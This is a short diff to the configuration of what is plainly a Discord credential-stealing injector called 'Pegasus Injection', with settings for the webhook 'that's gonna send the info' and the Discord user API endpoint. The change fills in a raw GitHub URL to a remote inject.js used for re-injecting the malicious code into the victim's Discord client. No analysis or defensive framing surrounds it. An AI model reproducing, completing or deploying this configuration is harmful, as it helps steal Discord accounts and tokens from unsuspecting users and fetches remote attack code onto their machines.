@@ -13,7 +13,7 @@ const config = {
   embed_name: "Pegasus Injection", //name of the webhook thats gonna send the info
   embed_icon: "https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg".replace(/ /g, "%20"), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 14423100, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: "", //injection url for when it reinjects
+  injection_url: "https://raw.githubusercontent.com/KaZerCfx/INject/main/inject.js", //injection url for when it reinjects
   api: "https://discord.com/api/v9/users/@me",
   nitro: {
     boost: {
